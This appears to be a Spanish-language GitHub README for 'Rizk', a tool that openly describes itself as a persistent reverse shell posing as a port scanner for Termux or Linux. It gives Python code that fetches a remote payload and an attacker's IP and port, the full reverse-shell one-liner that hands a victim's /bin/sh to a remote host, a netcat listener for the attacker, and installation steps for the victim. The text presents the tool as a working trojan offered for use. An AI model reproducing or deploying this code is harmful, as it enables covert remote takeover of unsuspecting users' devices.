<h1 align="center">Rizk</h1>
<p align="center">Advertencia: Esto es una shell inversa persistente enfocado a Termux o Linux, simula ser un escaner de puertos.</p>

## Los datos mas importantes son: 
| rizk/fields/mysx/asa.py
```python
import requests
r = requests.get('https://host/codepython.html')
# r: Aquí se inserta un código malicioso, una shell inversa 

p = requests.get('https://host/ipport.html')
#p: Aquí se coloca ip y puerto: ejemplo en el html 192.168.0.1:1234

def aspojffqwafouwe():
	return (r.text).encode("utf-16") # retorna el contenido de r codificado en utf-16
def foewijgreoig():
	return (p.text.encode("utf-16")) # retorna el contenido de p codificado en utf-16
```

| El enlace "https://host/codepython.html" debe tener lo siguiente en su interior:
```html
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

| El enlace "https://host/ipport.html" debe tener lo siguiente en su interior:
```html
HOST:PORT
```

## Atacante:
El atacante tendrá que esperar para recibir los datos con netcat:
```bash
nc -nvlp 1234
```

## Victima:
la victima deberá instalar la aplicación y correrla sin mas

# Instalación:

| Descargar
```git
git clone https://github.com/krootca/rizk.git
```
| Entrar en el archivo
```git
cd rizk
```
| Instalar los requisitos:
```git
pip install -r requirements.txt
```
| Uso:
```git
python init.py
```
